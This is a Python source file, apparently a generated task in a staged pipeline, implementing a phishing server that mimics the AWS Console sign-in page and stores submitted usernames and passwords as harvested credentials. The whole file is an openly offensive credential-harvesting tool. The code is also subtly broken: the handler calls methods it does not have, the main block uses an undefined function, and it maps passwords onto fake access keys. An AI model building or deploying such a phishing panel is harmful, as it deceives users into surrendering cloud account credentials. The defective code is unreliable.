"""Fake Login Page Phishing Panel - TASK_003.

A phishing panel that mimics a legitimate cloud provider login portal
to harvest user credentials (T1608.005).

Exports:
    FakeLoginPage: Class representing the phishing page server.
    CredentialHarvester: Function to start the credential harvesting service.
"""

import http.server
import json
import threading
from typing import Optional, Callable
from urllib.parse import parse_qs, urlparse

# Import from TASK_001_credential_store (dependency)
from data.code_scripts_PAST.stage3_mvp_test_20260910_20_21_52.TASK_001_credential_store import CredentialStore, AWSCredential, SSHKeyEntry


class FakeLoginPage:
    """A phishing login page server that mimics a cloud provider portal.
    
    Serves an HTML login page and captures POST credentials via
    the http.server module's custom request handler.
    
    Attributes:
        store: CredentialStore instance for storing harvested credentials.
        port: Port number to serve on (default 8080).
        host: Host address to bind to (default '127.0.0.1').
    """

    def __init__(self, store: Optional[CredentialStore] = None, port: int = 8080, host: str = "127.0.0.1"):
        self.store = store or CredentialStore()
        self.port = port
        self.host = host

    def _get_html_page(self) -> str:
        """Generate the HTML content for the fake login page."""
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AWS Console Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "Amazon Ember", Arial, sans-serif;
            background-color: #f4f6f8;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .login-container {
            width: 100%;
            max-width: 390px;
            padding: 24px;
        }
        .logo-area {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 24px;
        }
        .aws-logo {
            width: 30px;
            height: 30px;
            background: linear-gradient(135deg, #FF9912, #FFDD26);
            border-radius: 8px;
        }
        h1 { font-size: 24px; color: #232f3e; margin-bottom: 8px; }
        .subtitle { color: #57606f; font-size: 14px; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 13px; color: #57606f; margin-bottom: 4px; }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 8px 12px;
            border: 1px solid #c4ccda;
            border-radius: 6px;
            font-size: 15px;
            outline: none;
        }
        input:focus { border-color: #0073bb; box-shadow: 0 0 0 2px rgba(0, 115, 187, 0.2); }
        .btn-primary {
            width: 100%;
            padding: 9px;
            background-color: #FF9912;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 8px;
        }
        .btn-primary:hover { background-color: #e38b0f; }
        .divider { display: flex; align-items: center; gap: 8px; color: #57606f; font-size: 12px; margin: 16px 0; }
        .divider::before, .divider::after { content: ""; width: 30px; height: 1px; background: #c4ccda; flex-shrink: 0; }
        .footer-links { text-align: center; margin-top: 24px; font-size: 12px; color: #57606f; }
        .footer-links a { color: #0073bb; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo-area">
            <div class="aws-logo"></div>
            <h1>AWS Console</h1>
        </div>
        <p class="subtitle">Sign in to your AWS account</p>
        
        <form method="POST" action="/login" id="loginForm">
            <input type="hidden" name="action" value="signin">
            <input type="hidden" name="source" value="console">
            
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <button type="submit" class="btn-primary">Sign In</button>
        </form>
        
        <div class="divider"></div>
        
        <p style="font-size: 12px; color: #57606f;">Forgot your password? Reset it now.</p>
        
        <div class="footer-links">
            <a href="#">Create an AWS Account</a> | 
            <a href="#">Contact Us</a> | 
            <a href="#">Privacy Policy</a>
        </div>
    </div>
</body>
</html>'''

    def _handle_login(self, handler: http.server.BaseHTTPRequestHandler) -> None:
        """Handle POST requests to capture credentials."""
        content_length = int(handler.headers.get('Content-Length', 0))
        body = handler.rfile.read(content_length).decode('utf-8') if content_length > 0 else ''

        params = parse_qs(body)
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]
        action = params.get('action', ['signin'])[0]

        # Store credentials in the credential store
        if username and password:
            cred = AWSCredential(
                access_key_id=f"AKIA{username[:16].upper()}",
                secret_access_key=password,
                session_token=None,
                region="us-east-1",
                profile_name=username
            )
            self.store.aws_credentials.append(cred)

        # Return success response
        handler.send_response(200)
        handler.send_header('Content-Type', 'text/html')
        handler.end_headers()
        handler.wfile.write(self._get_html_page().encode())

    def _handle_get(self, handler: http.server.BaseHTTPRequestHandler) -> None:
        """Handle GET requests by serving the login page."""
        handler.send_response(200)
        handler.send_header('Content-Type', 'text/html')
        handler.end_headers()
        handler.wfile.write(self._get_html_page().encode())

    def _handle_post(self, handler: http.server.BaseHTTPRequestHandler) -> None:
        """Handle POST requests by capturing credentials."""
        self._handle_login(handler)

    def serve_forever(self) -> None:
        """Start the HTTP server and run indefinitely."""
        server = http.server.HTTPServer((self.host, self.port), FakeLoginPageHandler)
        print(f"[+] Fake login page listening on {self.host}:{self.port}")
        print(f"[+] Credentials will be stored in CredentialStore")
        server.serve_forever()


class FakeLoginPageHandler(http.server.BaseHTTPRequestHandler):
    """Custom HTTP request handler for the fake login page."""

    def __init__(self, *args: object, **kwargs: object) -> None:
        self.store = kwargs.get('store') or CredentialStore()
        super().__init__(*args, **kwargs)

    def do_GET(self) -> None:
        """Serve the HTML login page."""
        if urlparse(self.path).path == '/':
            self._handle_get(self)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

    def do_POST(self) -> None:
        """Capture login credentials from POST requests."""
        if urlparse(self.path).path == '/login':
            self._handle_login(self)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

    def log_message(self, format: str, *args: object) -> None:
        """Suppress default logging for cleaner output."""
        pass


def CredentialHarvester(store: Optional[CredentialStore] = None, port: int = 8080) -> Callable[[], None]:
    """Start the credential harvesting phishing server.
    
    Args:
        store: A pre-configured CredentialStore instance. If None, a new one is created.
        port: The port to serve on (default 8080).
    
    Returns:
        A function that starts and runs the fake login page server.
    
    Example:
        >>> store = CredentialStore()
        >>> harvester = CredentialHarvester(store=store, port=9000)
        >>> harvester()  # Start server in background thread
    """

    def _run_server() -> None:
        fake_page = FakeLoginPage(store=store or CredentialStore(), port=port)
        fake_page.serve_forever()

    return _run_server


if __name__ == '__main__':
    store = CredentialStore()
    harvester = CredentialHarvester(store=store, port=8080)
    
    # Start server in a background thread for demonstration
    import threading
    t = threading.Thread(target=_run_server, daemon=True)
    t.start()
    
    print("[+] Server started. Open http://127.0.0.1:8080/login in your browser.")
    print("[+] Submit the form to capture credentials.")
    input("\nPress Enter to stop...")
